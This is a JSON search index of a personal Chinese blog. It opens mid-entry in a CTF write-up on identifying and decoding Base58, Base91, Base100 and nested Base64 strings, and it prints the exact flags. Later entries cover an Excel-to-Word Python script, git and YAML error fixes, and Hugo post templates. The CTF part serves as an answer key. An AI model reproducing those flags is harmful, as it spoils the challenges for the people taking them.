忽略了数字“1”、“8”和“0”，因为它们可能与字母“I”，“B”和“O”混淆 4.Base16——示例61646D696E 它的特点是没有等号并且数字要多于字母\n原理： Base16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的“=”符号。\n字母表：0123456789ABCDEF\n5.Base85——示例Ao(mgHZs%;@rH3q+EVNE@ru=2 特点是奇怪的字符比较多，但是很难出现等号\n6.base91——示例@iH\u0026lt;,{)eG$7\u0026amp;G9jLrrh+=[j;H 上面的是同一个字符输出的base85和base91，还是有一定的区别的，大不了两个都试试\n6.Base100——示例👘👛👤👠👥 特点就是一堆Emoji表情\nBase100编码/解码工具（又名：Emoji表情符号编码/解码），可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。\n进制 url 图片码 wp 2i9Q8AtDo5oMZd6UQrvegggb4o9qMrcNk5syu5dCyGcXfoSwXhtujiJwDv Fa+33_\u0026amp;6M7_#+*Dl~Rqbm]5psR$/ix$qCgDFx4m6?42+Qw.S7wy=d`3H05EQ]Zoa+U,\u0026lt;q40S2Nx0TCmY8w;=0;@6xP+cj+EYWG?cO:suHUc.=8\u0026amp;S|wfcA_3X(M0/fb$R0X(Il)\u0026amp;GlNMX@DgXI#oxij{i5UkbO[iS[Op;F[2SI%%7Pmbp$i(dG![5tV\u0026lt;gmN1b3O(I.[me,6l\u0026lt;,mWo\u0026#34;/r=8.1v\u0026lt;1.Io^\u0026gt;aY%+JG[\u0026gt;uWNh*~E!RL#4J91*N@1KK]Z.Tti5zDun#\u0026gt;I3\u0026lt;gQWi6Re3Z`PH!Li.LP}pkw;d=[g@$Meigb2byfe0jopB+NdwOlAkpR(F+wZ*BJ6LLmSi9%xz(i#pxP//g,yiW2`Ei0hvePTYwDAdl,Td]m`pG 🐬👘🐭👛🐮🐯🐭🐯🐬👘🐪🐪🐮🐫🐫🐬🐫👝🐬🐫🐫👜🐫🐪🐫👜🐬🐫🐫👘🐫🐪🐬🐨🐭🐰🐪🐨🐫🐫🐬🐨🐮👘🐭🐮🐮🐯🐫👚🐬🐫🐬🐩🐫🐬🐬🐩🐫🐬🐬🐰🐮🐫🐬🐨🐬🐬🐬🐰🐮👘🐬🐨🐬🐪🐪🐧🐪🐬🐫👜🐬🐫🐭👚🐫🐬🐫👜🐭👘🐬🐭🐫🐮🐬🐩🐫🐫🐭👙🐪🐨🐫👜🐫🐫🐫👘🐪🐰 Zns5NkE1QS1FQjNsZzc5OEUtQ0Q0My1FOUE2M0Y4N31hMDQxLThEMDJD 1 ‌2i9Q8AtDo5oMZd6UQrvegggb4o9qMrcNk5syu5dCyGcXfoSwXhtujiJwDv\n先试了试base64，发现并不是，看到里面没有“i,O，l”这些特征字母，判断应该是base58，试了试\nflag{9B1BD979-39BF-48CD-B427-FF748A4C41E9} ok\n2 Fa+33_\u0026amp;6M7_#+*Dl~Rqbm]5psR$/ix$qCgDFx4m6?42+Qw.S7wy=d`3H05EQ]Zoa+U,\u0026lt;q40S2Nx0TCmY8w;=0;@6xP+cj+EYWG?cO:suHUc.=8\u0026amp;S|wfcA_3X(M0/fb$R0X(Il)\u0026amp;GlNMX@DgXI#oxij{i5UkbO[iS[Op;F[2SI%%7Pmbp$i(dG![5tV\u0026lt;gmN1b3O(I.[me,6l\u0026lt;,mWo\u0026quot;/r=8.1v\u0026lt;1.Io^\u0026gt;aY%+JG[\u0026gt;uWNh*~E!RL#4J91*N@1KK]Z.Tti5zDun#\u0026gt;I3\u0026lt;gQWi6Re3Z`PH!Li.LP}pkw;d=[g@$Meigb2byfe0jopB+NdwOlAkpR(F+wZ*BJ6LLmSi9%xz(i#pxP//g,yiW2`Ei0hvePTYwDAdl,Td]m`pG\n又乱又杂，字母大小写，数字，符号都有，结合特征感觉是base91，试了试\nCizNxpZPsm3Vidf81ufwcftctybK9dPbzC12Ht5K1rSyZqGiKM2KbgiKPMSMZe2pELQuwkwjXtTAfD8bHqiC8rhshE5gqBqw2tHN4nZ2ahcDa2ALrPXhBmv2N26VuzS6G4KEZCsN3rujdsuVLRAXJJzXW1qN1ecLthUNSvrsrMZqSgu82AFjgL37oDsTXKPqqH2pvmPLrr21GMJ8CLKvAFk2v6taaEfuByFqBt3XYw4QSatHNHhXnzN7KSn9BPNZbMcf4FAXEPL3FHcCaXWJf1igXxtWFbH38xJk8W6QPxRbYLQ7tg\n再看这是什么编码，大小写，base64，不对再试base58\nKZVES53FIU2UQUTLMRUU2M2COFKFITSDKZDGYWCNKU4U4TKWJJMFMV3TGFKDCSTSK5WFMVKWK5UDGVSEIF4FE2ZVKZLGYVSTMJCXAVKWKZJEOURSJZLVO3DMKZREK4DPLFKE4Q2SGFNEOV3LGVVU23CGGRKTENKHKYYWISDFIU4VOYJRLJEFI3LYKNLGYVTVKNWXQU2WIZKXSVTMMR3WG3CCKJIFIMB5\n全大写，base16或base32，但是字母特别多大概率不是base16\nVjIweE5HRkdiM3BqTTNCVFlXMU9NMVJXVWs1T1JrWlVUVWh3VDAxRk5VVlVSbEpUVVRGR2NWWllVbEpoYTNCR1ZGWk5kMlF4U25GV1dHeE9Wa1ZHTmxSVlVuSmxSVFUyVldwclBRPT0=\nbase32可以出来，大小写加等号，base64？\n果然是base64，只是进行了三次套娃，一次一次解出来就行了\nflag{3F70138A-37CC-4BB5-B2D1-0F5210309174}\n3 🐬👘🐭👛🐮🐯🐭🐯🐬👘🐪🐪🐮🐫🐫🐬🐫👝🐬🐫🐫👜🐫🐪🐫👜🐬🐫🐫👘🐫🐪🐬🐨🐭🐰🐪🐨🐫🐫🐬🐨🐮👘🐭🐮🐮🐯🐫👚🐬🐫🐬🐩🐫🐬🐬🐩🐫🐬🐬🐰🐮🐫🐬🐨🐬🐬🐬🐰🐮👘🐬🐨🐬🐪🐪🐧🐪🐬🐫👜🐬🐫🐭👚🐫🐬🐫👜🐭👘🐬🐭🐫🐮🐬🐩🐫🐫🐭👙🐪🐨🐫👜🐫🐫🐫👘🐪🐰\nbase100,直接上。\n5a6d78685a3374454f544e434e544a4351693144517a67784c545245524559745155597a515330354e546c454e6a564752446b314e444a39\n这个特征就很明显了，最大字符不超过f，而且数字占了大多部分，应该就是base16\nZmxhZ3tEOTNCNTJCQi1DQzgxLTREREYtQUYzQS05NTlENjVGRDk1NDJ9\n有大小写，有0 有\u0026rsquo;O\u0026rsquo;,base64直接出\nflag{D93B52BB-CC81-4DDF-AF3A-959D65FD9542}\n4 Zns5NkE1QS1FQjNsZzc5OEUtQ0Q0My1FOUE2M0Y4N31hMDQxLThEMDJD\n直接base64解出来\nf{96A5A-EB3lg798E-CD43-E9A63F87}a041-8D02C\n你要问我有没有猫腻，我也不知道\nflag{96A5A-EB3798E-CD43-E9A63F87041-8D02C}\n","permalink":"https://modesty258.github.io/posts/misc/%E7%BC%96%E7%A0%81/","summary":"​ 常见编码特征 粘个链接：[30种常见编码]https://cloud.tencent.com/developer/article/1748394 在线解码：https://ctf.bugku.com/tools.html base家族 base16 base32 base58 base62 base64 base91 base91 base100 1. Base64——示例YWRtaW","title":"编码"},{"content":"import os import xlrd import datetime import time from mailmerge import MailMerge from xlrd import xldate_as_datetime, xldate_as_tuple from docx import Document from docx.shared import Inches from docx.oxml.ns import qn from docx.enum.text import WD_ALIGN_PARAGRAPH def center_insert_img(doc, img1, img2): \u0026#34;\u0026#34;\u0026#34;插入图片\u0026#34;\u0026#34;\u0026#34; tables = doc.tables tab_2 = tables[0].rows[65].cells[30] ph_img2 = tab_2.paragraphs[0] run_img2 = ph_img2.add_run(\u0026#39;\u0026#39;) run_img2.add_picture(img2) tab_1 = tables[0].rows[65].cells[6] ph_img1 = tab_1.paragraphs[0] run_img1 = ph_img1.add_run(\u0026#39;\u0026#39;) run_img1.add_picture(img1) def save_img_to_doc(img1,img2,tpl_doc,res_doc): \u0026#34;\u0026#34;\u0026#34;把图片保存到doc文件中的指定位置\u0026#34;\u0026#34;\u0026#34; # 打开模板文件 document = Document(tpl_doc) # 插入图片居中 center_insert_img(document, img1,img2) # 保存结果文件 document.save(res_doc) import zipfile from PIL import Image import os import re def get_img_from_excel(test_file): new_file = test_file.replace(\u0026#34;.xlsx\u0026#34;,\u0026#34;.zip\u0026#34;) os.rename(test_file,new_file) azip = zipfile.ZipFile(new_file) namelist = (azip.namelist()) print(namelist) img_name = 1 for idx in range(0,len(namelist)): if \u0026#39;media\u0026#39; in namelist[idx] and \u0026#39;jpeg\u0026#39; in namelist[idx]: f = azip.open(namelist[idx]) img = Image.open(f) img = img.convert(\u0026#34;RGB\u0026#34;) print(img_name) img.save(\u0026#39;image\u0026#39;+str(img_name)+\u0026#39;.jpeg\u0026#39;,\u0026#34;jpeg\u0026#34;) img_name += 1 azip.close() def remvocePiont(str_in): # index = str.find(\u0026#34;.\u0026#34;) # return str[0:index] str_in = str(str_in) str_in = str_in.replace(\u0026#39;null\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;NULL\u0026#39;, \u0026#39;\u0026#39;) if str_in.strip() == \u0026#39;\u0026#39;: str_in = \u0026#39;/\u0026#39; return str_in def get_level(b_74_1): if b_74_1 == \u0026#39;\u0026#39;: return b_74_1 b_74_1 = b_74_1.replace(\u0026#39;null\u0026#39;, \u0026#39;2类\u0026#39;) # print(b_74_1) b_74_1 = b_74_1.split(\u0026#39;:\u0026#39;)[1] b_74_1 = b_74_1.split(\u0026#39; \u0026#39;)[0] if \u0026#39;类类\u0026#39; in b_74_1: b_74_1 = b_74_1[:-1] return b_74_1 def get_next_year(b_76_1): if b_76_1 == \u0026#39;\u0026#39;: return b_76_1 b_76_1 = b_76_1.split(\u0026#39;-\u0026#39;)[0] b_76_1 = int(b_76_1) + 1 return b_76_1 print(\u0026#34;------------WORD保存路径-------------------\u0026#34;) print(\u0026#34;转换成功后的WORD文件保存在 :\u0026#34; + r\u0026#34;D:\\desk\\out\u0026#34;) print(\u0026#34;-------------------------------\u0026#34;) # path = input(\u0026#34;请输入excel文件路径+文件名（如：D:\\Desktop\\data.xlsx）：\u0026#34;) # path_dir = r\u0026#39;D:\\Users\\Modesty\\Desktop\\工作\\京昆高速桥梁卡片\u0026#39;) path_dir = r\u0026#39;D:\\desk\\zuoye\\1\\2\u0026#39; for path in os.listdir(path_dir): print(\u0026#34;开始转换，请稍等······ \u0026#34;) path = path_dir + \u0026#39;\\\\\u0026#39; + path print(path) # path = r\u0026#39;C:\\Users\\liujie\\Desktop\\1\\G5Z001EL0010京周路立交A匝道桥(右幅)卡片_2.xlsx\u0026#39; # C:\\Users\\liujie\\Desktop\\1\\G5Z001EL0010京周路立交A匝道桥(右幅)卡片_2.xlsx xl = xlrd.open_workbook(path) # 读取第一个表 table = xl.sheet_by_name(xl.sheet_names()[0]) # 获取表中行数 nrows = table.nrows # 生成Word文档存储目录 template_path = \u0026#34;template_3.docx\u0026#34; doc = MailMerge(template_path) # 打开模板文件 title = table.row_values(0)[0] a_0 = table.row_values(1)[3] b_1 = table.row_values(3)[2] b_2 = table.row_values(3)[5] b_3 = table.row_values(3)[8] b_4 = table.row_values(4)[2] b_5 = table.row_values(4)[5] b_6 = table.row_values(4)[8] b_7 = table.row_values(5)[2] if b_7.strip() == \u0026#39;\u0026#39;: b_7 = \u0026#39;公路桥梁\u0026#39; b_8 = table.row_values(5)[5] b_9 = table.row_values(5)[8] b_10 = table.row_values(6)[2] b_11 = table.row_values(6)[5] b_12 = table.row_values(6)[8] b_13 = table.row_values(7)[2] b_14 = table.row_values(7)[5] b_15 = table.row_values(7)[8] b_16 = table.row_values(8)[2] b_17 = table.row_values(8)[5] b_18 = table.row_values(8)[8] b_19 = table.row_values(10)[2] b_20 = table.row_values(10)[5] b_21 = table.row_values(10)[8] b_22 = table.row_values(11)[2] b_23 = table.row_values(11)[5] b_24 = table.row_values(11)[8] b_25 = table.row_values(12)[2] b_26 = table.row_values(12)[5] b_27 = table.row_values(12)[8] b_28 = table.row_values(13)[2] b_29 = table.row_values(13)[5] b_30 = table.row_values(13)[8] b_31 = table.row_values(14)[2] b_32 = table.row_values(14)[5] b_33 = table.row_values(14)[8] b_34 = table.row_values(15)[7] b_35 = table.row_values(17)[2] b_36 = table.row_values(18)[2] b_37 = table.row_values(19)[3] b_38 = table.row_values(20)[3] b_39 = table.row_values(21)[3] b_40 = table.row_values(22)[3] b_41 = table.row_values(23)[3] b_42 = table.row_values(24)[3] b_43 = table.row_values(25)[3] b_44 = table.row_values(26)[3] b_45 = table.row_values(27)[3] b_46 = table.row_values(28)[3] b_47 = table.row_values(29)[3] b_48 = table.row_values(30)[3] b_49 = table.row_values(31)[3] b_50 = table.row_values(32)[3] b_51 = table.row_values(33)[3] b_52 = table.row_values(34)[3] b_53 = table.row_values(35)[3] b_54 = table.row_values(36)[3] b_55 = table.row_values(37)[3] b_56 = table.row_values(38)[3] b_57 = table.row_values(39)[3] b_58 = table.row_values(40)[3] b_59 = table.row_values(41)[3] # 读取第二个表 table = xl.sheet_by_name(xl.sheet_names()[1]) b_60 = table.row_values(1)[2] b_61 = table.row_values(1)[5] b_62 = table.row_values(1)[8] b_63 = table.row_values(2)[2] b_64 = table.row_values(2)[5] b_65 = table.row_values(2)[8] b_66 = table.row_values(3)[2] b_67 = table.row_values(3)[5] b_68 = table.row_values(3)[8] b_69 = table.row_values(4)[2] b_70 = table.row_values(4)[5] b_71 = table.row_values(4)[8] b_72_1 = table.row_values(8)[0] b_72_2 = table.row_values(9)[0] b_72_3 = table.row_values(10)[0] b_72_4 = table.row_values(11)[0] b_72_5 = table.row_values(12)[0] b_72_6 = table.row_values(13)[0] b_72_7 = table.row_values(14)[0] b_72_8 = table.row_values(15)[0] b_73_1 = table.row_values(8)[2] b_73_2 = table.row_values(9)[2] b_73_3 = table.row_values(10)[2] b_73_4 = table.row_values(11)[2] b_73_5 = table.row_values(12)[2] b_73_6 = table.row_values(13)[2] b_73_7 = table.row_values(14)[2] b_73_8 = table.row_values(15)[2] b_74_1 = get_level(table.row_values(8)[3]) b_74_2 = get_level(table.row_values(9)[3]) b_74_3 = get_level(table.row_values(10)[3]) b_74_4 = get_level(table.row_values(11)[3]) b_74_5 = get_level(table.row_values(12)[3]) b_74_6 = get_level(table.row_values(13)[3]) b_74_7 = get_level(table.row_values(14)[3]) b_74_8 = get_level(table.row_values(15)[3]) # b_75_1 = table.row_values(8)[5] # b_75_2 = table.row_values(9)[5] # b_75_3 = table.row_values(10)[5] # b_75_4 = table.row_values(11)[5] # b_75_5 = table.row_values(12)[5] # b_75_6 = table.row_values(13)[5] # b_75_7 = table.row_values(14)[5] # b_75_8 = table.row_values(15)[5] b_75_1 = \u0026#39;需进行小修保养\u0026#39; b_75_2 = \u0026#39;需进行小修保养\u0026#39; b_75_3 = \u0026#39;需进行小修保养\u0026#39; b_75_4 = \u0026#39;需进行小修保养\u0026#39; b_75_5 = \u0026#39;需进行小修保养\u0026#39; b_75_6 = \u0026#39;需进行小修保养\u0026#39; b_75_7 = \u0026#39;需进行小修保养\u0026#39; b_75_8 = \u0026#39;需进行小修保养\u0026#39; b_76_1 = get_next_year(table.row_values(8)[0]) b_76_2 = get_next_year(table.row_values(9)[0]) b_76_3 = get_next_year(table.row_values(10)[0]) b_76_4 = get_next_year(table.row_values(11)[0]) b_76_5 = get_next_year(table.row_values(12)[0]) b_76_6 = get_next_year(table.row_values(13)[0]) b_76_7 = get_next_year(table.row_values(14)[0]) b_76_8 = get_next_year(table.row_values(15)[0]) table = xl.sheet_by_name(xl.sheet_names()[2]) b_91 = table.row_values(15)[4] b_92 = table.row_values(15)[9] b_93 = str(xldate_as_datetime(table.row_values(15)[20], 0).strftime(\u0026#39;%Y/%m/%d\u0026#39;)) # 以下为填充模板中对应的域， doc.merge(title=title, a_0=remvocePiont(a_0), b_1=remvocePiont(b_1), b_2=remvocePiont(b_2), b_3=remvocePiont(b_3), b_4=remvocePiont(b_4), b_5=remvocePiont(b_5), b_6=remvocePiont(b_6), b_7=remvocePiont(b_7), b_8=remvocePiont(b_8), b_9=remvocePiont(b_9), b_10=remvocePiont(b_10), b_11=remvocePiont(b_11), b_12=remvocePiont(b_12), b_13=remvocePiont(b_13), b_14=remvocePiont(b_14), b_15=remvocePiont(b_15), b_16=remvocePiont(b_16), b_17=remvocePiont(b_17), b_18=remvocePiont(b_18), b_19=remvocePiont(b_19), b_20=remvocePiont(b_20), b_21=remvocePiont(b_21), b_22=remvocePiont(b_22), b_23=remvocePiont(b_23), b_24=remvocePiont(b_24), b_25=remvocePiont(b_25), b_26=remvocePiont(b_26), b_27=remvocePiont(b_27), b_28=remvocePiont(b_28), b_29=remvocePiont(b_29), b_30=remvocePiont(b_30), b_31=remvocePiont(b_31), b_32=remvocePiont(b_32), b_33=remvocePiont(b_33), b_34=remvocePiont(b_34), b_35=remvocePiont(b_35), b_36=remvocePiont(b_36), b_37=remvocePiont(b_37), b_38=remvocePiont(b_38), b_39=remvocePiont(b_39), b_40=remvocePiont(b_40), b_41=remvocePiont(b_41), b_42=remvocePiont(b_42), b_43=remvocePiont(b_43), b_44=remvocePiont(b_44), b_45=remvocePiont(b_45), b_46=remvocePiont(b_46), b_47=remvocePiont(b_47), b_48=remvocePiont(b_48), b_49=remvocePiont(b_49), b_50=remvocePiont(b_50), b_51=remvocePiont(b_51), b_52=remvocePiont(b_52), b_53=remvocePiont(b_53), b_54=remvocePiont(b_54), b_55=remvocePiont(b_55), b_56=remvocePiont(b_56), b_57=remvocePiont(b_57), b_58=remvocePiont(b_58), b_59=remvocePiont(b_59), b_60=remvocePiont(b_60), b_61=remvocePiont(b_61), b_62=remvocePiont(b_62), b_63=remvocePiont(b_63), b_64=remvocePiont(b_64), b_65=remvocePiont(b_65), b_66=remvocePiont(b_66), b_67=remvocePiont(b_67), b_68=remvocePiont(b_68), b_69=remvocePiont(b_69), b_70=remvocePiont(b_70), b_71=remvocePiont(b_71), b_72_1 = remvocePiont(b_72_1), b_72_2 = remvocePiont(b_72_2), b_72_3 = remvocePiont(b_72_3), b_72_4 = remvocePiont(b_72_4), b_72_5 = remvocePiont(b_72_5), b_72_6 = remvocePiont(b_72_6), b_72_7 = remvocePiont(b_72_7), b_72_8 = remvocePiont(b_72_8), b_73_1 = remvocePiont(b_73_1), b_73_2 = remvocePiont(b_73_2), b_73_3 = remvocePiont(b_73_3), b_73_4 = remvocePiont(b_73_4), b_73_5 = remvocePiont(b_73_5), b_73_6 = remvocePiont(b_73_6), b_73_7 = remvocePiont(b_73_7), b_73_8 = remvocePiont(b_73_8), b_74_1 = remvocePiont(b_74_1), b_74_2 = remvocePiont(b_74_2), b_74_3 = remvocePiont(b_74_3), b_74_4 = remvocePiont(b_74_4), b_74_5 = remvocePiont(b_74_5), b_74_6 = remvocePiont(b_74_6), b_74_7 = remvocePiont(b_74_7), b_74_8 = remvocePiont(b_74_8), b_75_1 = remvocePiont(b_75_1), b_75_2 = remvocePiont(b_75_2), b_75_3 = remvocePiont(b_75_3), b_75_4 = remvocePiont(b_75_4), b_75_5 = remvocePiont(b_75_5), b_75_6 = remvocePiont(b_75_6), b_75_7 = remvocePiont(b_75_7), b_75_8 = remvocePiont(b_75_8), b_76_1 = remvocePiont(b_76_1), b_76_2 = remvocePiont(b_76_2), b_76_3 = remvocePiont(b_76_3), b_76_4 = remvocePiont(b_76_4), b_76_5 = remvocePiont(b_76_5), b_76_6 = remvocePiont(b_76_6), b_76_7 = remvocePiont(b_76_7), b_76_8 = remvocePiont(b_76_8), b_91 = remvocePiont(b_91), b_93 = b_93 ) # 使用文件名 日期名称 # path_name = r\u0026#39;D:\\Users\\Modesty\\Desktop\\工作\\out\u0026#39; path_name = r\u0026#39;D:\\desk\\zuoye\\1\u0026#39; file_name = path.split(\u0026#39;\\\\\u0026#39;)[-1].replace(\u0026#39;.xlsx\u0026#39;, \u0026#39;\u0026#39;) if not os.path.exists(path_name): os.makedirs(path_name) word_name = path_name +\u0026#34;\\\\\u0026#34;+ file_name + \u0026#39;.docx\u0026#39; doc.write(word_name) doc.close() get_img_from_excel(path) save_img_to_doc(path_name+\u0026#39;\\\\image1.jpeg\u0026#39;,path_name+\u0026#39;\\\\image2.jpeg\u0026#39;,word_name,word_name) print(\u0026#34;转换成功\u0026#34;) # time.sleep(5) ","permalink":"https://modesty258.github.io/posts/tech/execl%E8%BD%AC%E5%8C%96%E4%B8%BAword/","summary":"import os import xlrd import datetime import time from mailmerge import MailMerge from xlrd import xldate_as_datetime, xldate_as_tuple from docx import Document from docx.shared import Inches from docx.oxml.ns import qn from docx.enum.text import WD_ALIGN_PARAGRAPH def center_insert_img(doc, img1, img2): \u0026#34;\u0026#34;\u0026#34;插入图片\u0026#34;\u0026#34;\u0026#34; tables = doc.tables tab_2 = tables[0].rows[65].cells[30] ph_img2 = tab_2.paragraphs[0] run_img2 = ph_img2.add_run(\u0026#39;\u0026#39;) run_img2.add_picture(img2) tab_1 = tables[0].rows[65].cells[6] ph_img1 = tab_1.paragraphs[0] run_img1 = ph_img1.add_run(\u0026#39;\u0026#39;) run_img1.add_picture(img1) def save_img_to_doc(img1,img2,tpl_doc,res_doc): \u0026#34;\u0026#34;\u0026#34;把图片保存到doc文件中的指定位置\u0026#34;\u0026#34;\u0026#","title":"Execl转化为word"},{"content":"​\nyaml配置文件报错：could not find expected \u0026lsquo;:\u0026rsquo; 在cmd对个人博客进行操作的时候常常会产生这个报错，拿记事本打开发现这一行并没有什么错误，但是就是存在报错\n其实也很简单，就是文件格式的错误\nError: \u0026quot;E:\\Myblog\\qqq\\config.yaml:171:1\u0026quot;: failed to unmarshal YAML: yaml: line 171: could not find expected ':'\n这个是说没有发现冒号后面的内容，yml配置文件遇到“：”或者“-”后面必须留一个空格！\n但是有时明明有空格，最主要的编译器的问题\n放到专业的编译器去查看，最好带颜色的，报错很直观\nStartYear: 2020 # 底部开始年份 FilingNo: PublicSecurityIconLink： PublicNetworkSecurity: 我这里是中英文的问题，切换一下就好了。\n[! [rejected] master -\u0026gt; master (fetch first) 当使用命令git push origin master 是，就会产生报错\n! [rejected] master -\u0026gt; master (fetch first) error failed to push some refs to 其实这个问题就是你要push的仓库里面本来就有文件，而且这个文件不能被本地识别，push的时候就会产生报错，解决无非就两个办法\n方法一 将仓库中的文件删除\n方法二 将仓库的文件拉取下来\n并且与本地进行合并，并且再次上传\ngit fetch origin master 然后按照以下步骤进行合并： git pull origin master git add . git commit -m \u0026#39;your commit message\u0026#39; git push origin master 如果上述代码有问题，可以试试下面的\ngit fetch origin master:tmp git rebase tmp git push origin HEAD:master git branch -D tmp 方法三，强制上传 但是注意，这可能会将之前仓库的内容覆盖，导致消失\ngit push origin master --force git push origin master -f short of force 因为我是第一次建站，里面只有用于生成页面而存在的readme，我直接覆盖了，成功上传\n","permalink":"https://modesty258.github.io/posts/blog/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/","summary":"​ yaml配置文件报错：could not find expected \u0026lsquo;:\u0026rsquo; 在cmd对个人博客进行操作的时候常常会产生这个报错，拿记事本打开发现这一行并没有什么错误，但是就是存在报错 其实也很简单，就是文件格式的错误 Error: \u0026quot;E:\\Myblog\\qqq\\config.yaml:171:1\u0026quot;: failed to unmarshal YAML: yaml: line 171: could not find expected ':' 这个是说没有发现冒号后面的内容，yml配置文件遇到“：”或者“-”后面必","title":"常见问题"},{"content":"1.基本头部信息修改 定位到文件：archetypes/default.md，添加如下代码\n--- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; date: {{ .Date }} lastmod: {{ .Date }} author: [\u0026#34;Sulv\u0026#34;] keywords: - categories: # 没有分类界面可以不填写 - tags: # 标签 - description: \u0026#34;\u0026#34; weight: slug: \u0026#34;\u0026#34; draft: false # 是否为草稿 comments: true # 本页面是否显示评论 reward: true # 打赏 mermaid: true #是否开启mermaid showToc: true # 显示目录 TocOpen: true # 自动展开目录 hidemeta: false # 是否隐藏文章的元信息，如发布日期、作者等 disableShare: true # 底部不显示分享栏 showbreadcrumbs: true #顶部显示路径 cover: image: \u0026#34;\u0026#34; #图片路径例如：posts/tech/123/123.png zoom: # 图片大小，例如填写 50% 表示原图像的一半大小 caption: \u0026#34;\u0026#34; #图片底部描述 alt: \u0026#34;\u0026#34; relative: false --- 这样的话以后每次生成文章可以直接利用cmd的命令：hugo new posts/tech/a.md\nposts/tech为地址，tech可以为空，会直接生成在content中\n","permalink":"https://modesty258.github.io/posts/blog/%E5%BF%AB%E6%8D%B7%E7%94%9F%E6%88%90%E6%96%87%E7%AB%A0/","summary":"1.基本头部信息修改 定位到文件：archetypes/default.md，添加如下代码 --- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; date: {{ .Date }} lastmod: {{ .Date }} author: [\u0026#34;Sulv\u0026#34;] keywords: - categories: # 没有分类界面可以不填写 - tags: # 标签 - description: \u0026#34;\u0026#34; weight: slug: \u0026#34;\u0026#34; draft: false # 是否为草稿 comments: true # 本页面是否显示评论 reward: true # 打赏 mermaid: true #是否开启mermaid showToc: true # 显示目录 TocOpen: true #","title":"利用cmd生成文章"},{"content":"","permalink":"https://modesty258.github.io/posts/tech/tech1/","summary":"","title":"Tech1"},{"content":"","permalink":"https://modesty258.github.io/posts/blog/blog/","summary":"","title":"Blog"},{"content":"部署到github https://zz2summer.github.io/github-pages-hugo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/ 我是小垃圾\n问题 大体步骤已经很清晰了\n将文件放在public中，具体代码实现 hugo 这一步很重要创建public cd public 网站会将初始文件放在这个目录下 git init 初始化 git remote add origin git@github.com:username/username.github.io.git#关联git仓库，注意需要提前设置好ssh，可以百度 git add . 选择所有文件 git commit -m \u0026#34;test\u0026#34; 创造需要上传的文件 git push origin master 注意这一步，应该提前将master设置为网站的默认 符号格式 这里换行符有可能会有警告，如果强行\n关联仓库 利用ssh将自己电脑与自己的git仓库给关联，不然会导致无法上传文件。\n将master设为网站默认 打开setting\n将master设置为默认，这样网站才会加载刚才上传文件\n","permalink":"https://modesty258.github.io/posts/blog/213123/","summary":"部署到github https://zz2summer.github.io/github-pages-hugo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/ 我是小垃圾 问题 大体步骤已经很清晰了 将文件放在public中，具体代码实现 hugo 这一步很重要创建public cd public 网站会将初始文件放在这个目录下 git init 初始化 git remote add origin git@github.com:username/username.github.io.git#关联git仓","title":"如何生成一篇文章"},{"content":" 传文字 第一步 新建一个markdown文件在需要的分类下面，起好名字\n然后命名好格式\n利用源代码模式修改时间和标题等内容\n--- title: \u0026#34;如何生成一篇文章\u0026#34; date: 2022-05-05T00:18:23+08:00 lastmod: 2022-05-05T00:18:23+08:00 author: [\u0026#34;Sulv\u0026#34;] keywords: - categories: - tags: - blog description: \u0026#34;\u0026#34; weight: slug: \u0026#34;\u0026#34; draft: false # 是否为草稿 comments: true reward: false # 打赏 mermaid: true #是否开启mermaid showToc: true # 显示目录 TocOpen: true # 自动展开目录 hidemeta: false # 是否隐藏文章的元信息，如发布日期、作者等 disableShare: true # 底部不显示分享栏 showbreadcrumbs: true #顶部显示路径 cover: image: \u0026#34;\u0026#34; #图片路径例如：posts/tech/123/123.png caption: \u0026#34;\u0026#34; #图片底部描述 alt: \u0026#34;\u0026#34; relative: false --- 偷偷：我也不知道上面是什么语言，总之复制过去就行了\n第二步 写文章\n传图片 在文章里面使用本地图片的方式： 比如我在content/posts/tech/下有一篇文章叫做 golang_base.md，那么在和该文章同一目录下新建一个文件夹叫做 golang_base，里面放图片如叫做 picture.png 的图片，那么在golang_base.md里面调用的时候可以这样写: ![](picture.png)\n仅用于这一主题，其他主体参照作者文档。\n","permalink":"https://modesty258.github.io/posts/blog/%E5%A6%82%E4%BD%95%E4%B8%8A%E4%BC%A0%E6%96%87%E7%AB%A0/","summary":"传文字 第一步 新建一个markdown文件在需要的分类下面，起好名字 然后命名好格式 利用源代码模式修改时间和标题等内容 --- title: \u0026#34;如何生成一篇文章\u0026#34; date: 2022-05-05T00:18:23+08:00 lastmod: 2022-05-05T00:18:23+08:00 author: [\u0026#34;Sulv\u0026#34;] keywords: - categories: - tags: - blog description: \u0026#34;\u0026#34; weight: slug: \u0026#34;\u0026#34; draft: false # 是否为草稿 comments: true reward: false # 打赏 mermaid: true #是否开启mermaid showToc: true # 显示目录 TocOpen: true # 自动展开目录","title":"如何生成一篇文章"},{"content":"","permalink":"https://modesty258.github.io/posts/life/life/","summary":"","title":"Life"},{"content":"","permalink":"https://modesty258.github.io/posts/read/read/","summary":"","title":"Read"},{"content":"read,hahahaha dididi\nshanghongliou\n","permalink":"https://modesty258.github.io/posts/web/web/","summary":"read,hahahaha dididi shanghongliou","title":"Web"},{"content":"\u0026lt;div\u0026gt; 科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 \u0026lt;/div\u0026gt; ","permalink":"https://modesty258.github.io/posts/tech/tech/","summary":"\u0026lt;div\u0026gt; 科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码科技代码 科技代码 科技代码 科技代码 科技代码 